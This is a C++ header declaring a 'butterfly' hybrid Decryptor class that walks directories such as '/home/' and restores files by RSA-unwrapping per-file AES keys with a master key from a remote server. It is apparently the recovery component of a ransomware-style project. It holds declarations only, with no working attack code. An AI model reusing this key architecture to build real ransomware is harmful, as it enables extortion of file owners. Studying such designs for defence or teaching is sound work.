
#ifndef BUTTERFLY_DECRYPTOR_H
#define BUTTERFLY_DECRYPTOR_H

#include <memory>

#include "crypto/cryptoThread.h"
#include "crypto/cryptoSecurity.h"
#include "crypto/rsaDecryptor.h"
#include "crypto/aesDecryptor.h"
#include "directoryIterator.h"
#include "bflyExceptions.h"
#include "bflyParams.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Decryptor to decrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
 */
class Decryptor : public CryptoThread, CryptoSecurity
{

private:
    std::string _decryptedCPrivateRSA, _privateKeyFromServer, _encCPrivateRSAFile;

    std::unique_ptr<rsa::RSADecryptor> _rsaDecryptorCPrivateRSA, _rsaDecryptorAESKey;
    std::unique_ptr<aes::AESDecryptor> _aesDecryptor;

public:

    /**
     * Constructor Decryptor
     *
     * Usage:
     *      std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor(decryptedCPrivateRSA));
     *      decryptor->invokeDir("/home/");
     *
     * @param decryptedCPrivateRSA: decrypted CPrivateRSA file/string from remote server
     */
    explicit Decryptor(const std::string &decryptedCPrivateRSA);

    /**
     * Constructor Decryptor
     *
     * Usage:
     *      std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor(privateKeyFromServer, encCPrivateRSAFile));
     *      decryptor->invokeDir("/home/");
     *
     * @param privateKeyFromServer: private Key file from Server (Masterkey file)
     * @param encCPrivateRSAFile: encrypted CPrivateRSA.bin file
     */
    Decryptor(const std::string &privateKeyFromServer, const std::string &encCPrivateRSAFile);

    /**
     * Destructor Decryptor
     */
    ~Decryptor() override = default;

    /**
     * Invokes the directory to start the decryption process
     *
     * @param dirPath: path to the directory
     */
    void invokeDir(const std::string &dirPath);

    /**
     * Decrypt the file with the AES Key/IV pair
     *
     * @param filepath: path to the file
     * @param aesKey: aes key for the file to decrypt
     * @param aesIV: aes iv for the file to decrypt
     */
    void decryptFileWithAES(const std::string &filepath);

    /**
     * handles large files with a dedicated thread in base class
     *
     * @param filepath: path of the file
     */
    void handleLargeFilesWithAES(const std::string &filepath) override;

    /**
    * Decrypts the AESKey.bin file to be able to get the decrypted AESKEY/AESIV
    *
    * @param filepathAESKey: path to the AESKey.bin
    * @param decAESKey: decrypted AESKey string
    * @param decAESIV: decrypted AESIV string
    */
    void decryptAESKeyPair(const std::string &filepathAESKey, std::string &decAESKey,  std::string &decAESIV);

};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_DECRYPTOR_H
